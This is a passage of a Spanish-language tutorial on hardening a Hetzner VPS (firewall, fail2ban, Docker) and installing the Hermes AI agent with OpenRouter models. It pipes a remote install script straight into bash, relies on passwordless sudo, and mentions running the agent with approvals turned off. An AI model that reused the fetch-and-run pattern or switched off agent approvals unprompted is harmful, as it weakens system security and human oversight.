> Todos los comandos de aquí en adelante (4.4, 4.5, 5, 6…) los ejecutas como `hermes` con `sudo` cuando hagan falta privilegios. Ya configuramos `sudo NOPASSWD` en el paso 4.2, así que `sudo` no te pedirá contraseña.

### 4.4. Firewall (UFW + Hetzner Cloud Firewall)

𝗗𝗼𝗯𝗹𝗲 𝗰𝗮𝗽𝗮: UFW dentro del VPS + Cloud Firewall en el panel.

#### Antes de tocar nada: ¿qué puerto necesita cada cosa?

Es habitual asumir que cada servicio que usa el VPS necesita un puerto abierto. 𝗡𝗼 𝗲𝘀 𝘃𝗲𝗿𝗱𝗮𝗱 para servicios *salientes*. Las conexiones que el VPS inicia hacia fuera (Discord, OpenRouter, GitHub, npm, apt…) 𝗻𝗼 𝗿𝗲𝗾𝘂𝗶𝗲𝗿𝗲𝗻 𝗻𝗶𝗻𝗴𝘂́𝗻 𝗽𝘂𝗲𝗿𝘁𝗼 𝗮𝗯𝗶𝗲𝗿𝘁𝗼 𝗲𝗻 𝘁𝘂 𝗳𝗶𝗿𝗲𝘄𝗮𝗹𝗹 — el firewall solo regula tráfico entrante. Por eso `ufw default allow outgoing` deja salir todo sin lista blanca.

- Tú haciendo SSH al VPS
  - Tipo: Entrante (tú → VPS, puerto 22)
  - ¿Puerto en tu firewall?: 𝗦𝗶́: 𝟮𝟮
- Tú abriendo `https://miprototipo.lab.rustyroboz.com` en el navegador
  - Tipo: Entrante (visitante → Caddy, puertos 80/443)
  - ¿Puerto en tu firewall?: 𝗦𝗶́: 𝟴𝟬 𝘆 𝟰𝟰𝟯
- Hermes hablando con Discord (recibiendo y enviando mensajes)
  - Tipo: 𝗦𝗮𝗹𝗶𝗲𝗻𝘁𝗲 (VPS → `gateway.discord.gg:443` por WebSocket)
  - ¿Puerto en tu firewall?: 𝗡𝗼
- Hermes llamando a OpenRouter
  - Tipo: Saliente (VPS → `openrouter.ai:443`)
  - ¿Puerto en tu firewall?: 𝗡𝗼
- Hermes haciendo `git pull`, `apt`, `npm install`
  - Tipo: Saliente
  - ¿Puerto en tu firewall?: 𝗡𝗼
- Hermes spawneando contenedores Docker
  - Tipo: Local entre procesos
  - ¿Puerto en tu firewall?: 𝗡𝗼

> Resumen: 𝗗𝗶𝘀𝗰𝗼𝗿𝗱 𝗻𝗼 𝗻𝗲𝗰𝗲𝘀𝗶𝘁𝗮 𝗾𝘂𝗲 𝗮𝗯𝗿𝗮𝘀 𝗻𝗮𝗱𝗮. El bot es un cliente; Discord nunca inicia conexiones hacia tu VPS.

Por tanto, lo que de verdad tienes que decidir es 𝗾𝘂𝗶𝗲́𝗻 𝗽𝘂𝗲𝗱𝗲 𝗹𝗹𝗲𝗴𝗮𝗿 𝗮𝗹 𝗽𝘂𝗲𝗿𝘁𝗼 𝟮𝟮 𝗱𝗲𝘀𝗱𝗲 𝗜𝗻𝘁𝗲𝗿𝗻𝗲𝘁.

#### El puerto 22: lo abrimos a todo Internet

`Source: 0.0.0.0/0, ::/0` para SSH. Sí, suena agresivo, pero es la opción correcta para tu caso (WiFi de casa con IP dinámica del router) 𝗽𝗼𝗿𝗾𝘂𝗲 𝗲𝗹 𝗲𝗻𝗱𝘂𝗿𝗲𝗰𝗶𝗺𝗶𝗲𝗻𝘁𝗼 𝗱𝗲𝗹 𝗽𝗮𝘀𝗼 𝟰.𝟯 𝘆𝗮 𝗵𝗮𝗰𝗲 𝗶𝗻𝘂́𝘁𝗶𝗹𝗲𝘀 𝗹𝗼𝘀 𝗶𝗻𝘁𝗲𝗻𝘁𝗼𝘀 𝗱𝗲 𝗳𝘂𝗲𝗿𝘇𝗮 𝗯𝗿𝘂𝘁𝗮:

- `PasswordAuthentication no` → no hay contraseña que adivinar.
- `PubkeyAuthentication yes` con clave Ed25519 → ~256 bits de seguridad, irrompible en la práctica.
- `AllowUsers hermes` → solo un usuario es siquiera elegible.
- `MaxAuthTries 3` + `fail2ban` → cualquier IP que insista queda baneada.

Los bots de Internet seguirán golpeando el puerto 22 (verás los intentos en `/var/log/auth.log`), pero saldrán expulsados antes de hacer nada útil. Es lo que hace la mayoría de servidores Linux en Internet y es perfectamente razonable para un lab personal. Las alternativas (restringir a tu IP — imposible sin IP fija; o montar Tailscale — extra de setup) son mejoras opcionales, no requisitos.

#### Aplicar UFW (dentro del VPS)

`sudo` necesario porque toca reglas del kernel:

```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw --force enable
sudo ufw status verbose
```

#### Aplicar Cloud Firewall (panel Hetzner)

Hetzner panel → 𝗙𝗶𝗿𝗲𝘄𝗮𝗹𝗹𝘀 → 𝗖𝗿𝗲𝗮𝘁𝗲 𝗙𝗶𝗿𝗲𝘄𝗮𝗹𝗹 → nombre `hermes-lab-fw`. Crea 𝟯 𝗿𝗲𝗴𝗹𝗮𝘀 𝗜𝗻𝗯𝗼𝘂𝗻𝗱, una por cada puerto:

- `SSH`
  - Sources: 𝗔𝗻𝘆 𝗜𝗣𝘃𝟰 + 𝗔𝗻𝘆 𝗜𝗣𝘃𝟲
  - Protocol: TCP
  - Port: 22
  - Port range: (vacío)
- `HTTP`
  - Sources: 𝗔𝗻𝘆 𝗜𝗣𝘃𝟰 + 𝗔𝗻𝘆 𝗜𝗣𝘃𝟲
  - Protocol: TCP
  - Port: 80
  - Port range: (vacío)
- `HTTPS`
  - Sources: 𝗔𝗻𝘆 𝗜𝗣𝘃𝟰 + 𝗔𝗻𝘆 𝗜𝗣𝘃𝟲
  - Protocol: TCP
  - Port: 443
  - Port range: (vacío)

> ⚠️ 𝗔𝘁𝗲𝗻𝗰𝗶𝗼́𝗻 𝗮𝗹 𝗳𝗼𝗿𝗺𝘂𝗹𝗮𝗿𝗶𝗼 𝗱𝗲 𝗛𝗲𝘁𝘇𝗻𝗲𝗿:
>
> - 𝗦𝗼𝘂𝗿𝗰𝗲𝘀 son las IPs origen. Pulsa el desplegable y marca los preset 𝗔𝗻𝘆 𝗜𝗣𝘃𝟰 y 𝗔𝗻𝘆 𝗜𝗣𝘃𝟲 (equivale internamente a `0.0.0.0/0` y `::/0`, pero en la UI selecciónalos por nombre).
> - 𝗣𝗼𝗿𝘁 es para un puerto único. Pon `22`, `80` o `443`.
> - 𝗣𝗼𝗿𝘁 𝗿𝗮𝗻𝗴𝗲 se deja 𝘃𝗮𝗰𝗶́𝗼. Solo se usa para rangos como `8000-8100`. Si pegas IPs ahí, Hetzner devuelve `Port is too low`.

#### La regla ICMP que viene por defecto: déjala

Hetzner crea automáticamente una cuarta regla `Protocol: ICMP, Sources: Any IPv4 + Any IPv6`. 𝗠𝗮𝗻𝘁𝗲𝗻𝗹𝗮. ICMP no es un puerto de servicio, es el protocolo de control de red:

- Hace que `ping` y `traceroute` funcionen (diagnóstico básico cuando algo falla).
- Soporta 𝗣𝗮𝘁𝗵 𝗠𝗧𝗨 𝗗𝗶𝘀𝗰𝗼𝘃𝗲𝗿𝘆, sin la cual conexiones por VPN o redes con MTU pequeño se cuelgan en silencio al transferir archivos grandes.
- En IPv6, ICMPv6 incluye Neighbor Discovery y Router Advertisement: si lo bloqueas, 𝗜𝗣𝘃𝟲 𝗱𝗲𝗷𝗮 𝗱𝗲 𝗳𝘂𝗻𝗰𝗶𝗼𝗻𝗮𝗿. No es opcional.

El riesgo de dejarlo abierto es mínimo (un atacante puede verificar que el host está vivo, pero tu IP ya es pública igualmente) y los floods los absorbe la protección DDoS de Hetzner antes de llegar al VPS.

> ¿𝗣𝗼𝗿 𝗾𝘂𝗲́ 𝗹𝗮 𝗿𝗲𝗴𝗹𝗮 𝗜𝗖𝗠𝗣 𝗻𝗼 𝘁𝗶𝗲𝗻𝗲 𝗽𝘂𝗲𝗿𝘁𝗼? Los puertos son un concepto de TCP/UDP. ICMP identifica los mensajes por "type" y "code" (echo request, echo reply, destination unreachable…), no por puerto. Hetzner deshabilita los campos Port y Port range automáticamente cuando seleccionas `Protocol: ICMP`. Es correcto que estén vacíos.

Aplica la firewall al servidor `hermes-lab` en la pestaña 𝗔𝗽𝗽𝗹𝘆 𝘁𝗼 del propio firewall.

📸 [images/06-hetzner-firewall.png]

> No abras puertos de aplicaciones (3000, 8080, etc.). Caddy hará el reverse proxy en 80/443.

### 4.5. Fail2ban

Activa la jail por defecto para SSH:

```bash
sudo systemctl enable --now fail2ban
sudo fail2ban-client status sshd
```

> ⚠️ 𝗔𝘃𝗶𝘀𝗼 𝗶𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁𝗲 𝗱𝘂𝗿𝗮𝗻𝘁𝗲 𝗲𝗹 𝘀𝗲𝘁𝘂𝗽 𝗶𝗻𝗶𝗰𝗶𝗮𝗹: mientras estés probando claves SSH y autenticación, es muy fácil dispararte 5+ intentos fallidos seguidos y que fail2ban 𝘁𝗲 𝗯𝗮𝗻𝗲𝗲 𝘁𝘂 𝗽𝗿𝗼𝗽𝗶𝗮 𝗜𝗣 𝗱𝗲 𝗰𝗮𝘀𝗮. Síntoma típico: ping al servidor funciona, pero `ssh` y `Test-NetConnection -Port 22` dan timeout aunque las firewalls estén OK.
>
> Si te pasa, entra por la Consola web de Hetzner (panel → servidor → botón Console) y desbanea:
>
> ```bash
> sudo fail2ban-client status sshd          # ver IPs baneadas
> sudo fail2ban-client unban --all          # desbanear todo
> ```
>
> Para evitarlo del todo durante la configuración inicial, mantén fail2ban parado y actívalo al final del paso 4:
>
> ```bash
> sudo systemctl stop fail2ban              # mientras configuras
> # … cuando todo funciona estable …
> sudo systemctl start fail2ban
> ```
>
> O whitelistea tu IP en `/etc/fail2ban/jail.local`:
>
> ```bash
> sudo tee /etc/fail2ban/jail.local <<'EOF'
> [DEFAULT]
> ignoreip = 127.0.0.1/8 ::1 TU_IP_PUBLICA
> EOF
> sudo systemctl restart fail2ban
> ```
>
> (Saca tu IP pública con `Invoke-RestMethod ifconfig.me` desde PowerShell.)

---

## 5. Instalar Docker y Docker Compose

### ¿Por qué instalamos Docker si Hermes no lo pide?

En el paso 4.1 dije que la única dependencia manual de Hermes es `git`, y es cierto: el `install.sh` se encarga de Python/Node/uv/ripgrep/ffmpeg en un entorno aislado. 𝗣𝗲𝗿𝗼 𝗗𝗼𝗰𝗸𝗲𝗿 𝗻𝗼 𝗲𝘀 𝘂𝗻𝗮 𝗱𝗲𝗽𝗲𝗻𝗱𝗲𝗻𝗰𝗶𝗮 𝗱𝗲 𝗛𝗲𝗿𝗺𝗲𝘀, es una dependencia de la 𝗮𝗿𝗾𝘂𝗶𝘁𝗲𝗰𝘁𝘂𝗿𝗮 𝗾𝘂𝗲 𝗲𝘀𝘁𝗮𝗺𝗼𝘀 𝗺𝗼𝗻𝘁𝗮𝗻𝗱𝗼. Lo necesitamos por tres razones, todas decididas en pasos posteriores:

- 𝗦𝗮𝗻𝗱𝗯𝗼𝘅 𝗱𝗲 𝗲𝗷𝗲𝗰𝘂𝗰𝗶𝗼́𝗻 𝗱𝗲𝗹 𝗮𝗴𝗲𝗻𝘁𝗲 (`terminal.backend: docker`)
  - Definido en: Paso 9.1
  - Sin Docker: Hermes ejecutaría comandos directamente en el host. Pierdes la primera capa de aislamiento que justifica `approvals.mode: off`
- 𝗥𝗲𝘃𝗲𝗿𝘀𝗲 𝗽𝗿𝗼𝘅𝘆 𝗰𝗼𝗻 𝗛𝗧𝗧𝗣𝗦 𝗮𝘂𝘁𝗼𝗺𝗮́𝘁𝗶𝗰𝗼 (Caddy)
  - Definido en: Opcional, fuera del alcance de este artículo
  - Sin Docker: No tienes subdominios HTTPS para los prototipos
- 𝗖𝗮𝗱𝗮 𝗽𝗿𝗼𝘁𝗼𝘁𝗶𝗽𝗼 𝗴𝗲𝗻𝗲𝗿𝗮𝗱𝗼 𝗽𝗼𝗿 𝗛𝗲𝗿𝗺𝗲𝘀
  - Definido en: Consecuencia natural del enfoque basado en contenedores
  - Sin Docker: Cada proyecto contaminaría dependencias del sistema; sin aislamiento entre prototipos

Si decidieras renunciar a las tres cosas (`terminal.backend: local`, sin Caddy, ejecutar prototipos directamente en host), podrías saltarte esta sección. 𝗡𝗼 𝗹𝗼 𝗿𝗲𝗰𝗼𝗺𝗶𝗲𝗻𝗱𝗼 para un lab 24/7 — es lo que diferencia "tengo un agente jugando con mi servidor" de "tengo una incubadora aislada de proyectos".

### ¿Y no debería correr Hermes mismo dentro de Docker?

Es una alternativa válida y la docu oficial de Hermes en Docker (https://hermes-agent.nousresearch.com/docs/user-guide/docker). Existe una imagen oficial `nousresearch/hermes-agent:latest`.

𝗩𝗲𝗻𝘁𝗮𝗷𝗮𝘀 de la opción containerizada: actualizaciones triviales (`docker pull && docker compose up -d`), aislamiento total del host, todo el estado en un único volumen `/opt/data`.

𝗣𝗼𝗿 𝗾𝘂𝗲́ 𝗻𝘂𝗲𝘀𝘁𝗿𝗮 𝗴𝘂𝗶́𝗮 𝘃𝗮 𝗰𝗼𝗻 𝗶𝗻𝘀𝘁𝗮𝗹𝗮𝗰𝗶𝗼́𝗻 𝗻𝗮𝘁𝗶𝘃𝗮:

- Más fácil de debuggear (logs directos, `hermes doctor`, `hermes update` funcionan sin saltos de contenedor).
- Acceso directo al filesystem del host para los volúmenes de proyectos sin "Docker dentro de Docker".
- El servicio systemd del paso 13 envuelve el binario nativo, lo que da control fino sobre límites de recursos.
- Es lo que hace el Quickstart oficial (https://hermes-agent.nousresearch.com/docs/getting-started/quickstart/).

Si en el futuro quieres migrar a Hermes containerizado, los datos de `~/.hermes/` son portables: solo necesitas montarlos en `/opt/data` del contenedor.

### Instalar Docker (oficial)

Sigues como `hermes`. Instala Docker desde el repo oficial:

```bash
sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
sudo chmod a+r /etc/apt/keyrings/docker.gpg

echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \
  https://download.docker.com/linux/ubuntu $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

sudo apt update
sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

sudo usermod -aG docker hermes
```

#### Aplicar la pertenencia al grupo `docker`

`usermod -aG docker hermes` añade tu usuario al grupo `docker`, pero 𝗹𝗼𝘀 𝗴𝗿𝘂𝗽𝗼𝘀 𝘀𝗼𝗹𝗼 𝘀𝗲 𝗰𝗮𝗿𝗴𝗮𝗻 𝗮𝗹 𝗶𝗻𝗶𝗰𝗶𝗮𝗿 𝘀𝗲𝘀𝗶𝗼́𝗻: la sesión SSH actual sigue sin verlo. Comprueba el estado primero:

```bash
groups        # te lista los grupos de la sesión actual
id -nG hermes # los grupos REALES del usuario en /etc/group
```

Si `groups` no incluye `docker` pero `id -nG hermes` sí, confirma que el cambio está hecho a nivel de sistema y solo falta refrescar la sesión.

Tienes tres formas de hacerlo, ordenadas de más simple a más quirúrgica:

𝗢𝗽𝗰𝗶𝗼́𝗻 𝟭 — 𝗖𝗲𝗿𝗿𝗮𝗿 𝘆 𝘃𝗼𝗹𝘃𝗲𝗿 𝗮 𝗮𝗯𝗿𝗶𝗿 𝗦𝗦𝗛 (𝗹𝗮 𝗺𝗮́𝘀 𝗹𝗶𝗺𝗽𝗶𝗮):

```bash
exit          # o Ctrl+D — cierra la sesión actual
```

Y desde tu portátil, vuelves a entrar:

```bash
ssh -i ~/.ssh/hetzner_hermes hermes@SERVER_IP
groups        # ahora debería incluir 'docker'
```

𝗢𝗽𝗰𝗶𝗼́𝗻 𝟮 — 𝗦𝗶𝗻 𝗰𝗲𝗿𝗿𝗮𝗿 𝗦𝗦𝗛, 𝗮𝗯𝗿𝗶𝗿 𝘂𝗻 𝘀𝘂𝗯-𝘀𝗵𝗲𝗹𝗹 𝗰𝗼𝗻 𝗲𝗹 𝗴𝗿𝘂𝗽𝗼 𝗿𝗲𝗰𝗮𝗿𝗴𝗮𝗱𝗼:

```bash
exec sg docker -c bash
groups        # incluye 'docker'
```

`sg` (switch group) lanza un shell con la membresía recargada. Cuando salgas (`exit`), vuelves al shell original sin grupo `docker`. Útil si tienes procesos abiertos en la sesión que no quieres perder.

𝗢𝗽𝗰𝗶𝗼́𝗻 𝟯 — 𝗥𝗲𝗰𝗮𝗿𝗴𝗮𝗿 𝗴𝗿𝘂𝗽𝗼𝘀 𝗰𝗼𝗻 `𝗻𝗲𝘄𝗴𝗿𝗽`:

```bash
newgrp docker
groups
```

Similar a `sg` pero reemplaza el shell actual. También se sale con `exit`.

Cualquiera de las tres vale. La más recomendable es 𝗼𝗽𝗰𝗶𝗼́𝗻 𝟭 porque es lo que harás siempre que reconectes y deja todo en estado limpio.

#### Verifica que Docker funciona como `hermes`

```bash
docker run --rm hello-world
docker compose version
```

`hello-world` debe imprimir el mensaje de bienvenida de Docker. Si te dice `permission denied while trying to connect to the Docker daemon socket`, es que el grupo todavía no se aplicó: vuelve al paso anterior y reconecta SSH.

---

## 6. Instalar Hermes Agent

Como usuario `hermes`:

```bash
curl -fsSL https://raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.sh | bash
```

> 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁𝗲: 𝗰𝗼𝗺𝗽𝗼𝗿𝘁𝗮𝗺𝗶𝗲𝗻𝘁𝗼 𝗿𝗲𝗮𝗹 𝗱𝗲𝗹 𝗶𝗻𝘀𝘁𝗮𝗹𝗮𝗱𝗼𝗿 𝗮𝗰𝘁𝘂𝗮𝗹. Ese comando ya no se limita a "instalar binarios": al terminar abre el asistente interactivo de Hermes para dejar configurado al menos un proveedor LLM. La doc oficial indica que el instalador gestiona dependencias, clona el repo, crea el entorno, expone el comando global `hermes` 𝘆 𝗰𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗮 𝗲𝗹 𝗽𝗿𝗼𝘃𝗲𝗲𝗱𝗼𝗿 𝗟𝗟𝗠. Refs: Installation (https://hermes-agent.nousresearch.com/docs/getting-started/installation), Quickstart (https://hermes-agent.nousresearch.com/docs/getting-started/quickstart/).

### 6.1. Qué elegir en el asistente

Cuando acabe la instalación base y aparezca el configurador:

1. Elige `𝗤𝘂𝗶𝗰𝗸 𝘀𝗲𝘁𝘂𝗽`.
2. En proveedor, elige `𝗢𝗽𝗲𝗻𝗥𝗼𝘂𝘁𝗲𝗿`.
3. Pega tu API key de OpenRouter (`sk-or-v1-...`).
4. Si te pide elegir modelo, selecciona `𝗾𝘄𝗲𝗻/𝗾𝘄𝗲𝗻𝟯.𝟲-𝗽𝗹𝘂𝘀`.
5. Cuando pregunte si quieres conectar una plataforma de mensajería (`Connect a messaging platform?`), 𝗱𝗲 𝗺𝗼𝗺𝗲𝗻𝘁𝗼 𝘀𝗮́𝗹𝘁𝗮𝗹𝗼: deja la selección en `Skip` o confirma sin seleccionar ninguna plataforma. La idea en esta primera pasada es 𝗻𝗼 𝗰𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗮𝗿 𝘁𝗼𝗱𝗮𝘃𝗶́𝗮 𝗲𝗹 𝗴𝗮𝘁𝗲𝘄𝗮𝘆 y comprobar antes que Hermes base funciona bien en CLI.

> 𝗣𝗼𝗿 𝗾𝘂𝗲́ 𝗻𝗼 𝗱𝗲𝗷𝗮𝗺𝗼𝘀 𝗗𝗲𝗲𝗽𝗦𝗲𝗲𝗸 𝗩𝟰 𝗣𝗿𝗼 𝗰𝗼𝗺𝗼 𝗿𝘂𝘁𝗮 𝗽𝗿𝗶𝗻𝗰𝗶𝗽𝗮𝗹 𝗲𝗻 𝗲𝘀𝘁𝗮 𝗴𝘂𝗶́𝗮: durante las pruebas reales en este VPS nos encontramos varios `HTTP 429` causados por saturación o degradación del upstream provider en OpenRouter. Para que el tutorial sea reproducible y estable, la configuración final se basa en `qwen/qwen3.6-plus` + `minimax/minimax-m2.7`, que en nuestras pruebas se comportó mejor.

> Según el flujo actual de Hermes, `Quick setup` usa el mismo selector de proveedor/modelo que `hermes model`, pero 𝗼𝗺𝗶𝘁𝗲 partes más largas del `Full setup`, como rotación de credenciales y configuración adicional de visión/TTS. Si más adelante quieres la configuración completa, ejecuta `hermes setup`.

### 6.2. Recargar la shell y verificar el binario

Cuando el asistente termine y vuelvas al prompt, 𝘀𝗶́ 𝗰𝗼𝗻𝘃𝗶𝗲𝗻𝗲 𝘀𝗲𝗴𝘂𝗶𝗿 𝗰𝗼𝗻 𝗲𝘀𝘁𝗼𝘀 𝗰𝗼𝗺𝗮𝗻𝗱𝗼𝘀:

```bash
source ~/.bashrc
hermes --version
```

`source ~/.bashrc` recarga el `PATH` por si el instalador acaba de añadir `~/.local/bin`, y `hermes --version` confirma que el comando ya es resoluble desde tu sesión actual.

> Si `source ~/.bashrc` da algún error raro de permisos, abre una sesión SSH nueva como `hermes` y vuelve a probar `hermes --version`. La propia FAQ de Hermes contempla ese caso.

Estructura post-install:

```
~/.hermes/
├── config.yaml      # configuración no-secreta (editable a mano)
├── .env             # API keys y secretos (chmod 600)
├── data/            # memoria, sesiones, FTS5
├── skills/          # skills instaladas
├── cron/            # jobs programados
└── logs/
```

Comprueba que todo está sano:

```bash
hermes doctor
```

---

## 7. Configurar OpenRouter como proveedor

> Si en el paso 6 ya hiciste `Quick setup` → `OpenRouter` y pegaste la API key, esta sección te sirve sobre todo para 𝘃𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝗿 que quedó bien guardada.

### 7.1. Saca una API key de OpenRouter

1. Crea cuenta en https://openrouter.ai/.
2. 𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀 → 𝗞𝗲𝘆𝘀 → 𝗖𝗿𝗲𝗮𝘁𝗲 𝗞𝗲𝘆, dale nombre `hermes-hetzner`, 𝗼𝗽𝗰𝗶𝗼𝗻𝗮𝗹: pon un límite de gasto mensual (recomendado: empieza en 20–30 $).
3. Copia la key (empieza por `sk-or-v1-…`).

📸 [images/07-openrouter-key.png]

### 7.2. Carga la key en Hermes

Si 𝗻𝗼 la metiste ya dentro del asistente del paso 6, puedes cargarla ahora:

```bash
hermes config set OPENROUTER_API_KEY sk-or-v1-XXXXXXXXXXXXXXXXXXXXXXXX
```

> Hermes coloca el secreto automáticamente en `~/.hermes/.env` (no en `config.yaml`). Si prefieres editar a mano: `chmod 600 ~/.hermes/.env` y añade `OPENROUTER_API_KEY=...`.
>
> Ref: Providers (https://hermes-agent.nousresearch.com/docs/integrations/providers).

#### Verificación importante: confirma que de verdad quedó guardada

Compruébalo explícitamente después del wizard:

```bash
grep '^OPENROUTER_API_KEY=' ~/.hermes/.env
hermes auth list
```

Qué deberías ver:

- en `~/.hermes/.env`, una línea `OPENROUTER_API_KEY=sk-or-v1-...`
- en `hermes auth list`, una credencial de `openrouter` con origen `env:OPENROUTER_API_KEY`

Si 𝗻𝗼 aparece en `.env`, vuelve a fijarla manualmente:

```bash
hermes config set OPENROUTER_API_KEY sk-or-v1-XXXXXXXXXXXXXXXXXXXXXXXX
```

> 𝗦𝗲𝗻̃𝗮𝗹 𝗱𝗲 𝗾𝘂𝗲 𝗛𝗲𝗿𝗺𝗲𝘀 𝗡𝗢 𝗲𝘀𝘁𝗮́ 𝘂𝘀𝗮𝗻𝗱𝗼 𝘁𝘂 𝗽𝗿𝗼𝗽𝗶𝗮 𝗸𝗲𝘆: errores `HTTP 429` de OpenRouter con texto parecido a `add your own key to accumulate your rate limits` y metadatos `is_byok: false`. En ese caso, el asistente dejó OpenRouter seleccionado como proveedor, pero la API key no quedó persistida correctamente.

### 7.3. Selecciona el proveedor

Si quieres comprobar la selección actual:

```bash
hermes model
```

Elige `openrouter` y, como modelo principal, `qwen/qwen3.6-plus`. En el siguiente paso afinaremos el resto de roles con `hermes config set`.

---

## 8. Configurar varios modelos para distintas tareas

Después del `Quick setup`, Hermes ya tiene un 𝗺𝗼𝗱𝗲𝗹𝗼 𝗽𝗿𝗶𝗻𝗰𝗶𝗽𝗮𝗹. Pero eso 𝗻𝗼 𝘀𝗶𝗴𝗻𝗶𝗳𝗶𝗰𝗮 que configure automáticamente todos los demás roles. Lo importante es entender esta separación:

- `𝗺𝗼𝗱𝗲𝗹.𝗱𝗲𝗳𝗮𝘂𝗹𝘁`: modelo principal del chat normal.
- `𝗱𝗲𝗹𝗲𝗴𝗮𝘁𝗶𝗼𝗻`: modelo para subagentes; si no lo defines, hereda el principal.
- `𝗮𝘂𝘅𝗶𝗹𝗶𝗮𝗿𝘆.𝘃𝗶𝘀𝗶𝗼𝗻`: tareas multimodales (capturas, análisis de imágenes).
- `𝗮𝘂𝘅𝗶𝗹𝗶𝗮𝗿𝘆.𝗰𝗼𝗺𝗽𝗿𝗲𝘀𝘀𝗶𝗼𝗻`: resúmenes de contexto cuando la conversación se compacta.
- `𝗳𝗮𝗹𝗹𝗯𝗮𝗰𝗸_𝗺𝗼𝗱𝗲𝗹`: modelo de respaldo si el principal falla por rate limit o caída del proveedor.
- `𝗮𝗴𝗲𝗻𝘁.𝗿𝗲𝗮𝘀𝗼𝗻𝗶𝗻𝗴_𝗲𝗳𝗳𝗼𝗿𝘁`: intensidad de razonamiento; no es otro modelo, es un ajuste del agente.

En esta guía lo vamos a dejar así, todo sobre OpenRouter:

- 𝗠𝗼𝗱𝗲𝗹𝗼 𝗽𝗿𝗶𝗻𝗰𝗶𝗽𝗮𝗹
  - Configuración: `qwen/qwen3.6-plus`
- 𝗗𝗲𝗹𝗲𝗴𝗮𝘁𝗶𝗼𝗻
  - Configuración: `minimax/minimax-m2.7`
- 𝗔𝘂𝘅𝗶𝗹𝗶𝗮𝗿𝘆 𝘃𝗶𝘀𝗶𝗼𝗻
  - Configuración: `google/gemini-3-flash-preview`
- 𝗔𝘂𝘅𝗶𝗹𝗶𝗮𝗿𝘆 𝗰𝗼𝗺𝗽𝗿𝗲𝘀𝘀𝗶𝗼𝗻
  - Configuración: `qwen/qwen3.6-plus`
- 𝗙𝗮𝗹𝗹𝗯𝗮𝗰𝗸 𝗺𝗼𝗱𝗲𝗹
  - Configuración: `minimax/minimax-m2.7`
- 𝗥𝗲𝗮𝘀𝗼𝗻𝗶𝗻𝗴 𝗲𝗳𝗳𝗼𝗿𝘁
  - Configuración: `medium` (recomendado) o `high`

> Usa `medium` como valor por defecto. Sube a `high` solo si ves que en tareas complejas Hermes se queda corto.

### 8.1. Configúralo con `hermes config set`

No hace falta abrir el YAML a mano. Como usuario `hermes`, ejecuta:

```bash
hermes config set model.provider openrouter
hermes config set model.default qwen/qwen3.6-plus

hermes config set delegation.provider openrouter
hermes config set delegation.model minimax/minimax-m2.7

hermes config set auxiliary.vision.provider openrouter
hermes config set auxiliary.vision.model google/gemini-3-flash-preview

hermes config set fallback_model.provider openrouter
hermes config set fallback_model.model minimax/minimax-m2.7

hermes config set agent.reasoning_effort medium
hermes config set display.personality technical
hermes config set display.show_reasoning true

hermes config set auxiliary.compression.provider openrouter
hermes config set auxiliary.compression.model qwen/qwen3.6-plus
hermes config set timezone Europe/Madrid
hermes config set provider_routing.sort throughput
```

Después de cambiar modelos, reinicia el gateway para que el servicio cargue la config nueva:

```bash
sudo "$(command -v hermes)" gateway stop --system
sudo "$(command -v hermes)" gateway start --system
sudo "$(command -v hermes)" gateway status --system
```

Si quieres verificar el resultado completo en el fichero:

```bash
grep -n "default:\\|delegation:\\|fallback_model:\\|reasoning_effort:\\|personality:\\|show_reasoning:\\|timezone:\\|vision:\\|compression:" ~/.hermes/config.yaml
```

> 𝗤𝘂𝗲́ 𝗲𝘀𝘁𝗮́ 𝗽𝗮𝘀𝗮𝗻𝗱𝗼 𝗲𝗻 𝗲𝘀𝗲 𝗲𝘀𝗰𝗲𝗻𝗮𝗿𝗶𝗼: normalmente no es un problema de timeout ni de tu VPS. OpenRouter balancea entre varios providers y, si el upstream del modelo elegido está saturado o degradado, puede devolverte `429` aunque todo lo local esté correcto. Por eso conviene tener un `fallback_model` real y, si hace falta, cambiar temporalmente el modelo principal del canal interactivo de Discord.
>
> También conviene que el 𝗺𝗼𝗱𝗲𝗹𝗼 𝗱𝗲 𝗰𝗼𝗺𝗽𝗿𝗲𝘀𝗶𝗼́𝗻 tenga una ventana de contexto grande. Si usas un compresor con menos contexto que el umbral de compresión del modelo principal, Hermes bajará el threshold de esa sesión para que quepa. Por eso dejamos `qwen/qwen3.6-plus` también en compresión.


### 8.2. Comprueba cómo ha quedado

```bash
hermes config
```

Aquí hay un matiz importante: `𝗵𝗲𝗿𝗺𝗲𝘀 𝗰𝗼𝗻𝗳𝗶𝗴` 𝗻𝗼 𝗶𝗺𝗽𝗿𝗶𝗺𝗲 𝘁𝗼𝗱𝗼 𝗲𝗹 𝗬𝗔𝗠𝗟, sino un 𝗿𝗲𝘀𝘂𝗺𝗲𝗻 de los valores principales. Por eso es normal que veas cosas como:

- `Model` con el principal actual (por ejemplo `qwen/qwen3.6-plus`)
- `Display` con `Personality: technical`
- `Display` con `Reasoning: on`
- `Context Compression` con el modelo auxiliar que hayas fijado
- `Auxiliary Models (overrides)` con `Vision`

Y que, en cambio, 𝗻𝗼 𝗮𝗽𝗮𝗿𝗲𝘇𝗰𝗮𝗻 𝗲𝘅𝗽𝗹𝗶́𝗰𝗶𝘁𝗮𝗺𝗲𝗻𝘁𝗲 en esa pantalla resumida:

- `delegation`
- `fallback_model`
- algunas claves internas de `agent`

